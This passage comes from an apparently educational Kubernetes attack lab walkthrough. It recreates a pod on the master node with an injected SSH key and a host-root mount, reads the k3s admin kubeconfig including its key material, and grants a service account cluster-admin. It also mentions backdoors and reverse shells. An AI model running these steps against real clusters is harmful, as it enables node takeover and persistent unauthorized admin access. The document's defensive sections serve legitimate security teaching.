{"metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"sshd\",\"namespace\":\"pwn-me\"},\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"kubernetes.io/hostname\",\"operator\":\"In\",\"values\":[\"k3d-pipeline-cluster-server-0\"]}]}]}}},\"containers\":[{\"command\":[\"sh\",\"-c\",\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDl6OFov1sHfa+UO4X+IKu9J0B0+fU9bALBbXgJ2wvv1qn9fs2KA9K7B1z052MtjMx+S9hko2K5WFV+4O9hg6/sNqs9VGyLey3CkctgFriceM69fWxDCwK0KPxWsZ0HOPo/qEGnTrE9Nmlo/MeZXgW3EVHvpiM/UgTahTFlMYu4sblEfBUA14gnJGaUr6HzQBVXZA4+nyDfVTVDBywzoIJVyZfm92OgQXQCUi9WsJIPr5OVd+WRvzBrAXJDTzx8LJJQUG7GB50Es9mCey9lIDBmmogu9HgUw8Y8tUatqNsgJQLhsOuTBcNOdj3UFpghByW8RVaWTMuLuAAb5Vz395lbPLLavVSUJx6mnMb3tKlv7cMbBe6b5wXeVdFLPFLCyk6fHj2P/bM2chqcmJN4GXkYV4tdZATZ8PxwZm9G2DDh7p0BBtZH7LS6n3UtMP/FSX7q4B/6ipkIqbZDIlLizBjys5w4FZEVtIgmqrSy16Klg4de/usZ7ho+LbEc3f+Yo4YvJBtejawsR7nQfM9fgkSrKG/PQyec+zeWJCe4OB9wirZxzz8WpncoTpecXZIblMPEyQ+PlggLxQUiF3Q2nY3Q+KSzLaJ7dCv98eu3blYORUG9WjsLWmyYLRfjjuMGCjTwN/uYMGBz+UyffWhOIiQhBBB9g9j6SCDOb7oEfwa7kw== root@vulnerable-app' \\u003e /root/.ssh/authorized_keys \\u0026\\u0026 ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config\"],\"env\":[{\"name\":\"SSH_ENABLE_ROOT\",\"value\":\"true\"}],\"image\":\"panubo/sshd:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"sshd\",\"volumeMounts\":[{\"mountPath\":\"/srv/host\",\"name\":\"host-vol\"}]}],\"restartPolicy\":\"Always\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-vol\"}]}}\n"}},"spec":{"$setElementOrder/containers":[{"name":"sshd"}],"$setElementOrder/volumes":[{"name":"host-vol"}],"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchExpressions":[{"key":"kubernetes.io/hostname","operator":"In","values":["k3d-pipeline-cluster-server-0"]}]}]}}},"containers":[{"$setElementOrder/volumeMounts":[{"mountPath":"/srv/host"}],"name":"sshd"}]}}
to:
Resource: "/v1, Resource=pods", GroupVersionKind: "/v1, Kind=Pod"
Name: "sshd", Namespace: "pwn-me"
for: "/tmp/pod.yml": pods "sshd" is forbidden: User "system:serviceaccount:pwn-me:vulnerable-app" cannot patch resource "pods" in API group "" in the namespace "pwn-me"
```

The reason is because we are only allowed to create, delete, get, and list pods in the namespace,
but not to modify them. However, this is super easy to sidestep by simply deleting the existing pod,
and creating a new one:

```
/ # kubectl delete pod sshd -n pwn-me
pod "sshd" deleted

/ # kubectl apply -f /tmp/pod.yml
pod/sshd created
```

Then we can find the IP again, `ssh` onto the pod, and check that we get the correct hostname:

```
/ # kubectl -n pwn-me get pods -o wide
NAME             READY   STATUS    RESTARTS   AGE     IP           NODE                            NOMINATED NODE   READINESS GATES
vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-pipeline-cluster-agent-1    <none>           <none>
sshd             1/1     Running   0          20s     10.42.0.53   k3d-pipeline-cluster-server-0   <none>           <none>

/ # ssh 10.42.0.53
The authenticity of host '10.42.0.53 (10.42.0.53)' can't be established.
ED25519 key fingerprint is SHA256:tHH8YEjpNALJ/g26uX5+Z1jZWjxdfiXgA5N+m+HQFao.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.42.0.53' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

sshd:~# chroot /srv/host
sshd:/# cat /etc/hostname
k3d-pipeline-cluster-server-0
```

It worked!

</details>

### How could this have been avoided?

<details>
  <summary>Show</summary>

Forbidding any scheduling of pods onto a master node would not allow us to schedule the pod there
and therefore gain access to the node that way. However, note that we could have tried to perform
lateral movement from the worker node onto the master node without passing through Kubernetes as
well, using vulnerabilities on the master node itself. Since nodes tend to be patched late (since it
is an effort and quite a risk to patch Kubernetes nodes when you have important stuff running on
Kubernetes), exploiting nodes once you have access to them tends to be quite straight-forward.

> The reason I did not show this to you is because I don't want this to become a tutorial for
> `metasploit`.

</details>

### Is this part realistic?

<details>
  <summary>Show</summary>

This scenario is realistic, albeit depending on the organization you would attack. Most larger
organizations hold their master nodes quite separate from worker nodes, amongst others exactly due
to such issues. In smaller clusters, master nodes sometimes allow to schedule pods when the worker
nodes become full (worker nodes have scheduling preference).

Learn about [Taints and Tolerations][taints-and-tolerations] to get more information on how to
remove scheduling on master nodes. Note however, that such taints can be removed via the Kubernetes
API, which might have been an attack vector from the worker node itself, if we would have found a
nice way to access the API (I didn't look for long).

</details>

### Best Practices to Consider

<details>
  <summary>Show</summary>

- Disallow scheduling of pods on master nodes (see [Taints and Tolerations][taints-and-tolerations].

</details>

[taints-and-tolerations]: https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/

## Post Exploitation

<details>
  <summary>Tip</summary>

Use the cluster configuration stored under `/etc/rancher/k3s/k3s.yaml` and edit the server setting
to contain the hostname of the master node instead of the local address. Then use it as a Kubernetes
configuration and you should have full access.

</details>

<details>
  <summary>Solution</summary>

Technically we have not yet reached the exploited stage: we don't yet have admin rights to the
Kubernetes API. From the master node:

```
sshd:/# kubectl cluster-info

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
The connection to the server 127.0.0.1:6443 was refused - did you specify the right host or port?
```

However, looking around for a Kubernetes configuration:

```
sshd:/# cat /etc/rancher/k3s/k3s.yaml
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUyTWprek1EVTJOemt3SGhjTk1qRXdPREU0TVRZMU5ETTVXaGNOTXpFd09ERTJNVFkxTkRNNQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUyTWprek1EVTJOemt3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUTWU4NGNBdGJEeVJWWXZwRmVjZ3k3cDlYZDNqemQvRDNBNjB6bmNDVm8KcVNzd3BSdndIQUhqUS93MWhBMHRMT2F3TlBqbmI5TTUwamt5ZlpQUGFrb05vMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVWQyN0N2dlNHWndhT3h2ZFkwN2h3CjRZL20ySUl3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUloQUlkWmF4eXpWczBMUFVVWWxJZDd0Z1QrL1BZVHJxSmkKWTJsT2dBNWkzMDZXQWlBc3NrK2dlSXdFU0Y1NTY2ZWQreTFtSE9OUFdaTHMrQVkySmhQb0lnNGNqZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://127.0.0.1:6443
  name: default
contexts:
- context:
    cluster: default
    user: default
  name: default
current-context: default
kind: Config
preferences: {}
users:
- name: default
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJrakNDQVRlZ0F3SUJBZ0lJT2RiQW44dEM0QVF3Q2dZSUtvWkl6ajBFQXdJd0l6RWhNQjhHQTFVRUF3d1kKYXpOekxXTnNhV1Z1ZEMxallVQXhOakk1TXpBMU5qYzVNQjRYRFRJeE1EZ3hPREUyTlRRek9Wb1hEVEl5TURneApPREUyTlRRek9Wb3dNREVYTUJVR0ExVUVDaE1PYzNsemRHVnRPbTFoYzNSbGNuTXhGVEFUQmdOVkJBTVRESE41CmMzUmxiVHBoWkcxcGJqQlpNQk1HQnlxR1NNNDlBZ0VHQ0NxR1NNNDlBd0VIQTBJQUJIZW5qVkF4UWI1Q1pKdDQKY29VOGlWY3VoNjNaSHZScElrTCswcm9sVW1GVk1meFBlVGl5Mys3K1VpSUlZTlV3TXplekgvMGc0VUhoUUJOTgpIN2p5SjFXalNEQkdNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0RBakFmCkJnTlZIU01FR0RBV2dCU2c5OFJnWm1lZkF0M0ZIczhOT0JTNTJBdmxhekFLQmdncWhrak9QUVFEQWdOSkFEQkcKQWlFQTBJOC9wLzcrVWdzNmE3Z2hvb0J3T3JvSEZtZFBuR1FPWGFjVEZHd1ZjekVDSVFEOTU5a1hWU2xlV2wrcQpzbGt1V05lVHZEYXVkZzcvYzBabTJqcDZxaU9tU1E9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCi0tLS0tQkVHSU4gQ0VSVElGSUNBVEUtLS0tLQpNSUlCZURDQ0FSMmdBd0lCQWdJQkFEQUtCZ2dxaGtqT1BRUURBakFqTVNFd0h3WURWUVFEREJock0zTXRZMnhwClpXNTBMV05oUURFMk1qa3pNRFUyTnprd0hoY05NakV3T0RFNE1UWTFORE01V2hjTk16RXdPREUyTVRZMU5ETTUKV2pBak1TRXdId1lEVlFRRERCaHJNM010WTJ4cFpXNTBMV05oUURFMk1qa3pNRFUyTnprd1dUQVRCZ2NxaGtqTwpQUUlCQmdncWhrak9QUU1CQndOQ0FBVE1RMytRRE10L3JJZkEwQyt1NE5kS2wvWE15cHVZbjNya0o3MkYyT3pIClZSZVpuN2ZBVDFldDMyZEFGdG11dEdDbVNGUU56czlXU3BnTnQ0dmlSMHE5bzBJd1FEQU9CZ05WSFE4QkFmOEUKQkFNQ0FxUXdEd1lEVlIwVEFRSC9CQVV3QXdFQi96QWRCZ05WSFE0RUZnUVVvUGZFWUdabm53TGR4UjdQRFRnVQp1ZGdMNVdzd0NnWUlLb1pJemowRUF3SURTUUF3UmdJaEFQTHFYYVFDRHRrSm9uZzBQWVVGMHRMZUVMQk1mbU93ClEweCt5RHVFY0JNYUFpRUFyVGsrYVhjWFU4YWQ5SFVySDNKN3dMTEVONGFLSmJMdVdzVUlERk9WNnZVPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    client-key-data: LS0tLS1CRUdJTiBFQyBQUklWQVRFIEtFWS0tLS0tCk1IY0NBUUVFSUxJQ1lpUDBOUzI2aWJlcG91LytDcWhRM05MaHA2NEtvb3dUVHNjWHBCempvQW9HQ0NxR1NNNDkKQXdFSG9VUURRZ0FFZDZlTlVERkJ2a0prbTNoeWhUeUpWeTZIcmRrZTlHa2lRdjdTdWlWU1lWVXgvRTk1T0xMZgo3djVTSWdoZzFUQXpON01mL1NEaFFlRkFFMDBmdVBJblZRPT0KLS0tLS1FTkQgRUMgUFJJVkFURSBLRVktLS0tLQo=
```

This has a name as if it would have high privileges. However, you can see the server endpoint is
`127.0.0.1:6443` (localhost) which does not seem to work from the last command. Let us try to change
that to simply have the hostname in the configuration:

```
sshd:/# cp /etc/rancher/k3s/k3s.yaml /tmp/config
sshd:/# export KUBECONFIG=/tmp/config
sshd:/# # modify the configuration to contain https://k3d-pipeline-cluster-server-0:6443 as the server!
sshd:/# vi /tmp/config
sshd:/# kubectl cluster-info
Kubernetes control plane is running at https://k3d-pipeline-cluster-server-0:6443
CoreDNS is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
Metrics-server is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
```

Woop woop! We are in! Let's look at what we are allowed to do:

```
sshd:/# kubectl auth can-i --list -n kube-system
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
```

Beautiful! I checked in the `kube-system` namespace (a typically protected namespace) and see that
`*.*` resource type with `[*]` as the permission verbs in the first line? That means we can do
whatever we want on whatever resource, i.e. we are cluster admins!

Now let us get to the dirty stuff, the post-exploit. Typically we would want a backdoor, so we don't
have to do that same attack vector again. Ideally the backdoor should be accessible no matter if the
application RCE vulnerability gets patched. What we could do is setup a SSH daemon that is exposed
outside the cluster with a very inconspicuous name in `kube-system`, and configure it as a static
resource such that no one can delete it via the Kubernetes API. This could be done by placing the
required Kubernetes resources in here:

```
sshd:/# ls /var/lib/rancher/k3s/server/manifests/
ccm.yaml  coredns.yaml  local-storage.yaml  metrics-server  rolebindings.yaml  traefik.yaml
```

K3s will create and ensure that these resources are as they are supposed to be all the time, no
matter what someone does on the Kubernetes API. Instead of a SSH daemon, we could also setup a
reverse shell to a command-and-control server, or many other beautiful things.

I will not show you how to do this because it is beside the point of this scenario. Instead, we will
provide our vulnerable application admin rights, such that we only need the RCE to be admins, and
don't need to perform the remaining attack everytime we want to for instance mine bitcoin on this
cluster.

Let us look as the service account that is used by our application:

```
sshd:/# kubectl -n pwn-me get pod vulnerable-app -o yaml
...
  serviceAccount: vulnerable-app
  serviceAccountName: vulnerable-app
...
```

Ok great, now in order to make that application a cluster admin, we only need to bind this
ServiceAccount to the cluster-admin ClusterRole. See the ClusterRoles:

```
sshd:/# kubectl get clusterroles
NAME                                                                   CREATED AT
cluster-admin                                                          2021-08-18T16:54:43Z
...
```

Let us create that RoleBinding:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: give-my-full-access
  namespace: pwn-me
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: vulnerable-app
  namespace: pwn-me
```

And apply it:

```bash
kubectl apply -f /tmp/rb.yml
```

Now exit every shell until you are again on your VM. Then fake the RCE again:

```bash
kubectl -n pwn-me exec -it vulnerable-app -- sh
```

Now directly from the vulnerable pod we can check our permissions:

```
/ # kubectl auth can-i --list -n pwn-me
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
pods                                            []                                    []               [create list get delete]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

KaBoom, we are done here! Congratz.


</details>
